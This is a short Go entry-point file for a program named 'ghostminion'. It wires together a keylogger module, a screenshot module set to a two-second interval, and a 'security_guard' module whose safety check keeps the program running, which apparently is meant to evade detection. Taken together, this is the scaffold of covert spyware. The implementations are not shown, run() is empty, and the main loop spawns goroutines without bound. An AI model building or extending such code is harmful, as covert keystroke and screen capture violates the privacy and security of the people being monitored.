package main

import (
	"ghostminion/apps"
	"ghostminion/db"
	"log"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	wg.Add(1) // for run app

	db.Init()

	appManager := apps.NewAppManager()
	addBuiltinApps(appManager)
	appManager.StartAll(&wg)
	app, err := appManager.GetApp("security_guard")
	if err != nil {
		log.Fatalf("failed to get security_guard app: %v", err)
	}
	securityGuard, ok := app.(*apps.SecurityGuardApp)
	if !ok {
		log.Fatalf("failed to cast security_guard app to SecurityGuardApp")
	}
	for securityGuard.IsSafeToRun() {
		go run()
	}
	appManager.StopAll()
}

func addBuiltinApps(am *apps.AppManager) {
	am.AddApp("keylogger", &apps.KeyLoggerApp{})
	am.AddApp("screenshot", &apps.ScreenshotApp{Interval: 2})
	securityGuard := &apps.SecurityGuardApp{}
	securityGuard.Validate()
	am.AddApp("security_guard", securityGuard)
}

func run() {}
